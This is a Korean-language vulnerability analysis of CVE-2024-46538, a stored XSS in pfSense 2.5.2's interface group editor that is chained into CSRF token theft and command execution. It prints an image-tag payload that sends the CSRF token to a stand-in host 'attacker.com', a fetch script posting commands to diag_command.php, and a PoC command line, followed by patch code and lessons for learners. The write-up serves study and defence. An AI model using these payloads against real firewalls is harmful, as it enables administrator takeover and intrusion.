# 취약점 개요

## 📋 설명

이 취약점은 **pfSense의 인터페이스 그룹 편집 기능에서 입력 검증이 제대로 이루어지지 않아 Stored XSS가 발생**한다는 점이 출발점입니다.

공격자가 악성 JavaScript를 삽입하면:

1. 관리자가 해당 페이지를 열람하는 순간
2. **CSRF 토큰 탈취 → Command Prompt 기능 악용하여 임의 명령 실행**
3. **방화벽 전체 장악**까지 이어집니다.

pfSense는 방화벽/라우터로 널리 사용되므로 XSS 하나가 치명적인 RCE로 이어지는 구조라는 것이 포인트입니다.

## ⚠️ 왜 위험한가?

**낮은 공격 난이도**: 그룹 편집 권한만 있으면 공격 가능

**치명적인 영향**: 방화벽 관리자 권한 탈취 → 명령 실행 → 방화벽 전체 장악

**XSS → RCE 체인**: 단일 XSS 취약점이 CSRF와 결합하여 RCE로 확장

**보안 장비 취약점**: 방화벽, 라우터와 같은 보안 장비도 취약해질 수 있음

**Stored XSS의 심각성**: 관리자 기준으로 실행되면 심각성 두 배, 관리자 권한 하이재킹 가능

---

## 취약점 정보

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| CVSS 점수      | 7.5 (High)                                                |
| 취약점 유형    | Stored XSS → CSRF Token 탈취 → 임의 명령 실행(RCE)        |
| 영향 버전      | pfSense 2.5.2                                              |
| 공격 난이도    | Low (그룹 편집 권한만 있으면 됨)                           |
| 공개일         | 2024년 10월 22일                                           |
| 핵심 영향       | 공격자가 방화벽 관리자 권한 탈취 → 명령 실행 → 방화벽 장악 |

## 🧠 핵심 원인: 입력 검증 부족과 출력 필터링 미흡

### 1) members 파라미터 검증 부족

문제 지점: `/usr/local/www/interfaces_groups_edit.php`

```php
$members = $_POST['members'];
$ifgroupentry['members'] = implode(" ", $members);
```

- 입력값 필터링 없음
- HTML 엔티티 변환 없음
- 문자열로 그대로 config.xml에 저장됨

즉, 공격자가 `<script>...</script>`를 넣으면 그대로 저장 → Stored XSS 발생.

### 2) 저장된 값이 그대로 렌더링됨

`/usr/local/www/interfaces_groups.php`에서 다음 로직이 문제:

```php
$members_str = implode(", ", $ifgroupentry['members']);
echo $members_str; // 필터링 없음 → 그대로 출력됨
```

→ 관리자 페이지가 XSS 페이로드를 그대로 실행하게 됨.

---

# 공격 시나리오

**Step 1. 공격자가 취약 계정으로 로그인**

- 그룹 편집 권한이 있는 계정으로 로그인

**Step 2. members 파라미터에 악성 JS 삽입 (Stored XSS)**

- 인터페이스 그룹 편집 페이지에서 `members` 파라미터에 악성 JavaScript 삽입

**Step 3. 관리자 접근 시 악성 JS 자동 실행**

- 관리자가 해당 페이지를 열람하는 순간 악성 JavaScript 자동 실행

**Step 4. CSRF Token 탈취**

```javascript
<img src=x onerror="fetch('https://attacker.com?token='+csrfMagicToken)">
```

- 관리자가 페이지에 들어오기만 하면 자동 탈취됨.

**Step 5. diag_command.php로 임의 명령 실행 요청 전송**

```javascript
var formData = new FormData();
formData.append("__csrf_magic", csrfMagicToken);
formData.append("txtCommand", "id");
formData.append("submit", "EXEC");

fetch("/diag_command.php", {
  method: "POST",
  body: formData
});
```

→ 관리자가 페이지 로드하는 순간 `id` 명령 실행됨.

**Step 6. 방화벽 장악 (RCE)**

- 공격자는 관리자 권한으로 임의 명령을 실행하여 방화벽 전체를 장악할 수 있습니다.

---

# 실습 환경 구성

| 역할   | 구성                | IP |
| ------ | ------------------- | -- |
| 피해자 | pfSense 2.5.2 (취약) | -  |
| 공격자 | Kali Linux          | -  |

## 사전 준비사항

- pfSense 취약 버전 설치
- 그룹 편집 권한이 있는 계정
- 기본적인 XSS/CSRF 이해
- JavaScript 지식

---

# 취약점 상세 분석

## 🧩 XSS → CSRF Token 탈취

- pfSense는 요청마다 CSRF 토큰을 요구합니다:

```javascript
var csrfMagicToken = window.csrfMagicToken;
```

- 그러나 Stored XSS가 있을 경우 아래처럼 바로 탈취 가능:

```javascript
<img src=x onerror="fetch('https://attacker.com?token='+csrfMagicToken)">
```

- 관리자가 페이지에 들어오기만 하면 자동 탈취됨.

## 🧩 CSRF 토큰을 이용한 RCE

- pfSense 관리자 메뉴에는 Command Prompt(진단 메뉴) 기능이 있어, 관리자는 PHP/시스템 명령을 실행할 수 있습니다.

- 해당 기능은 다음 엔드포인트로 요청을 보냅니다:

```
POST /diag_command.php
```
<br />
### 필요 파라미터:

| 파라미터      | 설명                        |
| ------------- | --------------------------- |
| `__csrf_magic`| CSRF Token                  |
| `txtCommand`  | 실행 명령 (예: id, ifconfig)|
| `submit`      | EXEC                        |

### 공격자는 XSS에서 바로 아래 스크립트를 실행시켜 RCE를 수행할 수 있습니다:

```javascript
var formData = new FormData();
formData.append("__csrf_magic", csrfMagicToken);
formData.append("txtCommand", "id");
formData.append("submit", "EXEC");

fetch("/diag_command.php", {
  method: "POST",
  body: formData
});
```

- → 관리자가 페이지 로드하는 순간 `id` 명령 실행됨.

## 💣 실제 공격 PoC 예시

```bash
python3 CVE-2024-46538.py \
  -u 192.168.102.52 \
  -i tester \
  -p 1q2w3e4r!@ \
  -c id
```

이 스크립트는 다음을 수행:

1. 취약한 members 영역에 XSS payload 삽입
2. 관리자 접근 시 자동 실행
3. 관리자 권한으로 `/diag_command.php`에 명령 수행

## 공격 난이도 분석

| 요구 조건              | 설명                                    |
| --------------------- | --------------------------------------- |
| 그룹 편집 권한 계정   | 관리자가 아니어도 됨                    |
| 관리자 페이지 접근 필요 없음 | 관리자 브라우저가 페이로드 페이지를 보기만 하면 공격 성공 |
| 네트워크 복잡도 없음   | 내부망 또는 외부 노출된 pfSense이면 모두 영향 |

따라서 공격 난이도는 Low입니다.

---

# 패치 정보

## 안전한 버전

- **pfSense 최신 버전** (2.5.2는 EoL)


## pfSense 팀의 패치 내용

### 1) 출력 시 HTML 엔티티 적용

```php
echo htmlspecialchars($members_str);
```

### 2) members 값이 유효한 인터페이스인지 검증 추가

```php
if (!in_array($member, $ifnamelist)) {
  input_errors[] = "Invalid interface member";
}
```

### 3) config.xml 저장 구조 개선

→ 최신 pfSense 버전 사용이 가장 권장됨

## 즉시 업데이트

pfSense 2.5.2는 EoL(End of Life)이므로 최신 버전으로 업데이트가 필수입니다.

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 XSS 단일 취약점이 CSRF와 결합하면 RCE로 확장 가능

실전 공격은 여러 취약점 연계가 핵심입니다.

## 🔹 방화벽, 라우터와 같은 보안 장비도 취약해질 수 있음

"보안 제품 = 안전"이라는 착각을 제거해야 합니다.

## 🔹 Stored XSS는 관리자 기준으로 실행되면 심각성 두 배

관리자 권한 하이재킹이 가능합니다.

## 🔹 CSRF Token 기반 방어도 XSS 한 방이면 무력화

토큰 탈취가 너무 쉬워서 XSS가 있으면 CSRF 방어가 무의미해집니다.

---

# 참고 자료

- [PoC Repository](https://github.com/EQSTLab/CVE-2024-46538)

- [pfSense 패치 커밋](https://github.com/pfsense/pfsense/commit/9a843098cf3f28c27c3e615c4c788c84bd29df6f)

- SK쉴더스 보고서